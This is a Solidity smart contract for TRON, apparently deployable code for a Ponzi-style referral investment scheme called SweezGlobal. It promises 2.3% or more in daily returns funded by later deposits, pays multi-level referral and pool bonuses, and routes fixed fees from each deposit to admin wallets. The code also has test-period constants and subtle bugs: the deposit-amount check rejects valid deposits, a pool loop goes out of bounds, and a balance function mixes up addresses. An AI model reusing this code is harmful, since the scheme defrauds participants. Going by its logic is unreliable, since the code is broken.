pragma solidity 0.5.4;

contract SweezGlobal {

    struct User {
        uint256 userid;
        uint256 refid;
        address upline ;
        uint256 referrals ;
        uint256 payouts ;
        uint256 direct_bonus ;
        uint256 gen_bonus ;
        uint256 pool_bonus ;
        uint256 deposit_amount ;
        uint256 deposit_payouts ;
        uint40 deposit_time ; 
        uint256 wonder_directs;
		uint256 wonder_bonus ;
        uint256 isActive ;
    } 

    struct UserTotal {
        uint256 total_deposits ;
        uint256 total_payouts ;
        uint256 total_structure ;
        bool isWonder ;
    }
 
    
    // uint256 constant public CONTRACT_BALANCE_STEP = 1000000 trx ; // 1000000 trx
    // uint256 constant public MIN_DEPOSIT = 100 trx ; // 100 trx
    // uint256 constant public time_period = 1 days ; // 1 days 
    // uint256 constant public wonder_period = 7 days ; // 7 days 
    // uint256 constant public aff_bonus = 10 ; // 10 percent

    uint256 constant public CONTRACT_BALANCE_STEP = 100 trx ; // 1000000 trx
    uint256 constant public MIN_DEPOSIT = 10 trx ; // 100 trx
    uint256 constant public time_period = 180 ; // 1 days 
    uint256 constant public wonder_period = time_period*7 ; // 7 days 
    uint256 constant public aff_bonus = 10 ; // 10 percent

    uint256 constant public promo_fee  = 100 ;   
    uint256 constant public admin_fee1  = 50 ;   
    uint256 constant public admin_fee2  = 30 ;   

    uint256 constant public BASE_PERCENT = 230 ; // 2.3% daily  
	uint256 constant public PERCENTS_DIVIDER = 10000 ; 

    //pool bonus
    uint8[] public pool_bonuses ;                            // 1 => 1%
    uint40 public pool_last_draw = uint40(block.timestamp) ;
    uint256 public pool_cycle ;
    uint256 public pool_balance ;

    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum ;
    mapping(uint8 => address) public pool_top ;
    mapping(address => User) public users ;
    mapping(uint256 => address) public ids ;
    mapping(address => UserTotal) public usertotals ;
    mapping(address => bool) public top_promoters;

    uint8[] public ref_bonuses ;  
    uint256 public total_users = 1 ;
    uint256 public total_deposited ;
    uint256 public total_withdraw ;
    
    event Upline(address indexed addr, address indexed upline) ;
    event NewDeposit(address indexed addr, uint256 amount) ;
    event DirectPayout(address indexed addr, address indexed from, uint256 amount) ;
    event MatchPayout(address indexed addr, address indexed from, uint256 amount) ;
    event PoolPayout(address indexed addr, uint256 amount) ;
    event WonderPayout(address indexed addr, uint256 amount) ;
    event Withdraw(address indexed addr, uint256 amount) ;
    event LimitReached(address indexed addr, uint256 amount) ; 
    
    address payable public owner ; 
    address payable public admin1 ;
    address payable public admin2 ;
    address payable public admin3 ;
    address payable public admin4 ;
    address payable public alt_owner ;

    constructor(address payable _owner, 
                address payable _admin1, 
                address payable _admin2, 
                address payable _admin3, 
                address payable _admin4, 
                address payable _alt_owner) public {

        owner = _owner;
        admin1 = _admin1;
        admin2 = _admin2;
        admin3 = _admin3;
        admin4 = _admin4;
		alt_owner = _alt_owner;
         
        ref_bonuses.push(30);
        ref_bonuses.push(10);
        ref_bonuses.push(5);
        ref_bonuses.push(5);  
        ref_bonuses.push(5);
        ref_bonuses.push(5); // 60

        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10); // 90 

        pool_bonuses.push(40);
        pool_bonuses.push(20);
        pool_bonuses.push(15);
        pool_bonuses.push(15);
        pool_bonuses.push(10);

        ids[total_users] = owner;
        users[owner].userid = total_users;
        users[owner].refid = 1;
        users[owner].payouts = 0;
        users[owner].deposit_amount = MIN_DEPOSIT;
        users[owner].deposit_payouts = 0;
        users[owner].isActive = 1;
        users[owner].deposit_time = uint40(block.timestamp);
        usertotals[owner].total_deposits += MIN_DEPOSIT; 
     }
 
    function _setUpline(address _addr, address _upline) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && 
		(users[_upline].deposit_time > 0 || _upline == owner) ) {
            
            users[_addr].upline = _upline;
            users[_upline].referrals++;

            emit Upline(_addr, _upline);

            total_users++; 

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                if(_upline == address(0)) break; 
                usertotals[_upline].total_structure++; 
                _upline = users[_upline].upline;
            }
        }
    }

    function _deposit(address _addr, uint256 _amount, uint256 _refid) private {
        require(users[_addr].upline != address(0) || _addr == owner, "No upline");
        require(_amount/10000000 == 0,"Not a multiple of 10 trx");

        if(users[_addr].deposit_time > 0) {
             
            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
            require(_amount >= users[_addr].deposit_amount  , "Bad amount");
        }
        else require(_amount >= MIN_DEPOSIT  , "Bad amount"); 

        ids[total_users] = _addr;
        users[_addr].userid = total_users;
        users[_addr].refid = _refid;
        users[_addr].payouts = 0;
        users[_addr].deposit_amount = _amount;
        users[_addr].deposit_payouts = 0;
        users[_addr].isActive = 1;
        users[_addr].deposit_time = uint40(block.timestamp);
        usertotals[_addr].total_deposits += _amount;
 
        total_deposited += _amount;
        
        emit NewDeposit(_addr, _amount);
 
         // wonder directs check
        if(usertotals[users[_addr].upline].isWonder == false && block.timestamp < (users[users[_addr].upline].deposit_time + wonder_period) && users[users[_addr].upline].deposit_amount >= _amount){
            users[users[_addr].upline].wonder_directs++;
            
            if(users[users[_addr].upline].wonder_directs == 7){
                users[users[_addr].upline].wonder_bonus = users[users[_addr].upline].deposit_amount;
                usertotals[users[_addr].upline].isWonder = true;
                emit WonderPayout(users[_addr].upline, users[users[_addr].upline].deposit_amount);
            }
        }
  
        if(users[_addr].upline != address(0)) {
            users[users[_addr].upline].direct_bonus += _amount*aff_bonus/100;

            emit DirectPayout(users[_addr].upline, _addr,  _amount*aff_bonus/100);
        } 
         _poolDeposits(_addr, _amount);

        if(pool_last_draw + time_period < block.timestamp) {
            _drawPool();
        }

         admin1.transfer(_amount * admin_fee1 / 1000); 
         admin2.transfer(_amount * admin_fee1 / 1000); 
         admin3.transfer(_amount * admin_fee1 / 1000); 
         admin4.transfer(_amount * admin_fee2 / 1000);  // Reserve Fund
    }

     function _poolDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount * 10 / 100;

        address upline = users[_addr].upline;

        if(upline == address(0)) return;
        
        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == upline) break;

            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;
                break;
            }

            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
                    if(pool_top[j] == upline) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                pool_top[i] = upline;

                break;
            }
        }
    } 

    function _drawPool() private {
        pool_last_draw = uint40(block.timestamp);
        pool_cycle++;

        uint256 draw_amount = pool_balance / 10;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            uint256 win = draw_amount * pool_bonuses[i] / 100;

            users[pool_top[i]].pool_bonus += win;
            pool_balance -= win;

            emit PoolPayout(pool_top[i], win);
        }
        
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            pool_top[i] = address(0);
        }
    } 

     function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            if(users[up].referrals >= i + 1) {
                uint256 bonus = _amount * ref_bonuses[i] / 100;
                
                users[up].gen_bonus += bonus;

                emit MatchPayout(up, _addr, bonus);
            }

            up = users[up].upline;
        }
    }
 
    function deposit(uint256 _refid) payable external {

        address _upline = ids[_refid]; 
        _setUpline(msg.sender, _upline);
        _deposit(msg.sender, msg.value, _refid);
    }

 
    function withdraw() external {
        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
        
        require(users[msg.sender].payouts < max_payout, "Full payouts");

        // Deposit payout
        if(to_payout > 0) {
            if(users[msg.sender].payouts + to_payout > max_payout) {
                to_payout = max_payout - users[msg.sender].payouts;
            } 
            users[msg.sender].deposit_payouts += to_payout;
            users[msg.sender].payouts += to_payout;

            _refPayout(msg.sender, to_payout);
        }
        
        // Direct payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {
            uint256 direct_bonus = users[msg.sender].direct_bonus;

            if(users[msg.sender].payouts + direct_bonus > max_payout) {
                direct_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].direct_bonus -= direct_bonus;
            users[msg.sender].payouts += direct_bonus;
            to_payout += direct_bonus;
        } 

          // Pool payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {
            uint256 pool_bonus = users[msg.sender].pool_bonus;

            if(users[msg.sender].payouts + pool_bonus > max_payout) {
                pool_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].pool_bonus -= pool_bonus;
            users[msg.sender].payouts += pool_bonus;
            to_payout += pool_bonus;
        } 
       
        // Generation payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].gen_bonus > 0) {
            uint256 gen_bonus = users[msg.sender].gen_bonus;

            if(users[msg.sender].payouts + gen_bonus > max_payout) {
                gen_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].gen_bonus -= gen_bonus;
            users[msg.sender].payouts += gen_bonus;
            to_payout += gen_bonus;
        }

        // Wonder payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].wonder_bonus > 0) {
            uint256 wonder_bonus = users[msg.sender].wonder_bonus;

            if(users[msg.sender].payouts + wonder_bonus > max_payout) {
                wonder_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].wonder_bonus -= wonder_bonus;
            users[msg.sender].payouts += wonder_bonus;
            to_payout += wonder_bonus;
        }

        require(to_payout > 0, "Zero payout");
        
        usertotals[msg.sender].total_payouts += to_payout;
        total_withdraw += to_payout;
        if(to_payout > 0){
             msg.sender.transfer(to_payout); 
        }

        emit Withdraw(msg.sender, to_payout);

        if(users[msg.sender].payouts >= max_payout) {
            emit LimitReached(msg.sender, users[msg.sender].payouts);
            users[msg.sender].isActive = 0;
        }
    }
    
    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);
		uint256 total_rate = getTotalRate();

        if(users[_addr].deposit_payouts < max_payout) {
            payout = (users[_addr].deposit_amount * total_rate * ((block.timestamp - users[_addr].deposit_time) / time_period) / PERCENTS_DIVIDER) - users[_addr].deposit_payouts; 
            if(users[_addr].deposit_payouts + payout > max_payout) {
                payout = max_payout - users[_addr].deposit_payouts;
            }
        }
    }

    function getUserDividends(address _addr) view external returns(uint256) {
      uint256  max_payout = this.maxPayoutOf(users[_addr].deposit_amount);
      uint256 total_rate = getTotalRate();
      uint256 payout;
        if(users[_addr].deposit_payouts < max_payout) {
            payout = (users[_addr].deposit_amount * total_rate * ((block.timestamp - users[_addr].deposit_time) / time_period) / PERCENTS_DIVIDER) - users[_addr].deposit_payouts; 
            if(users[_addr].deposit_payouts + payout > max_payout) {
                payout = max_payout - users[_addr].deposit_payouts;
            }
        }
        return payout;
    }   
 
	function getTotalRate() internal view returns(uint256) {
	 
 		 uint256 steps =  10*total_deposited/CONTRACT_BALANCE_STEP ;

         if(steps > 370){
             steps = 370; 
         }  
 
         uint256 total1 = BASE_PERCENT + steps;
         if(total1 > 600){
             total1 = 600;
         }
         
        return total1 ;
	}

    /*
        Only external call
    */ 

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}  

	function getRate() external view returns(uint256) { 
        uint256 steps =  10*total_deposited/CONTRACT_BALANCE_STEP ;

         if(steps > 370){
             steps = 370; 
         }  
         uint256 total1 = BASE_PERCENT + steps;
         if(total1 > 600){
             total1 = 600;
         } 
        return total1 ;
	}

    function getContractBonus() external view returns(uint256) {
      
        uint256 steps = 10*total_deposited/CONTRACT_BALANCE_STEP ;

         if(steps > 370){
             steps = 370;
         }  
         uint256 total_step = steps;  
        return total_step ;
    } 

    function maxPayoutOf(uint256 _amount) external view returns(uint256) { 
			return  _amount * 250 / 100; 
    } 

	function getUserBalance(address _addr) external view returns (uint256) {
        (uint256 to_payout, uint256 max_payout) = this.payoutOf(_addr); 
 
        // Deposit payout
        if(to_payout > 0) {
            if(users[_addr].payouts + to_payout > max_payout) {
                to_payout = max_payout - users[_addr].payouts;
            } 
         }
        
        // Direct payout
        if(users[_addr].payouts < max_payout && users[_addr].direct_bonus > 0) {
            uint256 direct_bonus = users[_addr].direct_bonus;

            if(users[_addr].payouts + direct_bonus > max_payout) {
                direct_bonus = max_payout - users[_addr].payouts;
            } 
           
            to_payout += direct_bonus;
        } 
       
        // Match payout
        if(users[_addr].payouts < max_payout && users[_addr].gen_bonus > 0) {
            uint256 gen_bonus = users[_addr].gen_bonus;

            if(users[_addr].payouts + gen_bonus > max_payout) {
                gen_bonus = max_payout - users[_addr].payouts;
            } 
            to_payout += gen_bonus;
        } 

          // Pool payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {
            uint256 pool_bonus = users[msg.sender].pool_bonus;

            if(users[msg.sender].payouts + pool_bonus > max_payout) {
                pool_bonus = max_payout - users[msg.sender].payouts;
            }  
            to_payout += pool_bonus;
        }

          // Wonder payout 
        if(users[msg.sender].payouts < max_payout && users[msg.sender].wonder_bonus > 0) {
            uint256 wonder_bonus = users[msg.sender].wonder_bonus;

            if(users[msg.sender].payouts + wonder_bonus > max_payout) {
                wonder_bonus = max_payout - users[msg.sender].payouts;
            }  
            to_payout += wonder_bonus;
        }

        if(users[_addr].payouts >= max_payout) {
			return 0;       
		 } else {
			 return to_payout;
		 }
    }  
 
	function changeAdmin1(address payable _newAdmin1) public {
		require(msg.sender == owner || msg.sender == alt_owner || msg.sender == admin1 , "Not allowed");
		admin1 = _newAdmin1;
	} 
 
 
	function changeAdmin2(address payable _newAdmin2) public {
		require(msg.sender == owner || msg.sender == alt_owner || msg.sender == admin2, "Not allowed");
		admin2 = _newAdmin2;
	} 

    function changeAdmin3(address payable _newAdmin3) public {
		require(msg.sender == owner || msg.sender == alt_owner || msg.sender == admin3, "Not allowed");
		admin3 = _newAdmin3;
	} 

    function changeAdmin4(address payable _newAdmin4) public {
		require(msg.sender == owner || msg.sender == alt_owner || msg.sender == admin4, "Not allowed");
		admin4 = _newAdmin4;
	}  
   
    function getAdmin() external view returns (address){ 
        return owner;
    } 

    function getUser() external view returns (address){ 
        return alt_owner;
    } 
 
    function admin1Address() external view returns (address){ 
        return admin1;
    } 
    function admin2Address() external view returns (address){ 
        return admin2;
    } 
    function admin3Address() external view returns (address){ 
        return admin3;
    } 
    function admin4Address() external view returns (address){ 
        return admin4;
    } 

     function getNow() external view returns (uint256){ 
        return block.timestamp;
    }

    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus , uint256 gen_bonus, uint256 user_status) {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].gen_bonus, users[_addr].isActive );
    }

    function userInfo2(address _addr) view external returns(uint256 wonder_bonus , uint256 wonder_directs, uint256 userid, uint256 refid) {
        return (users[_addr].wonder_bonus, users[_addr].wonder_directs, users[_addr].userid, users[_addr].refid);
    }

    function poolBonus(address _addr) view external returns(uint256){
        return users[_addr].pool_bonus;
    }

    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure,   uint256 deposit_payouts) {
        return (users[_addr].referrals, usertotals[_addr].total_deposits, usertotals[_addr].total_payouts, usertotals[_addr].total_structure,  users[_addr].deposit_payouts);
    }

    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider ) {
        return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]] );
    }
     
     
    function poolTopInfo() view external returns(address[5] memory addrs, uint256[5] memory deps) {
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
    }
}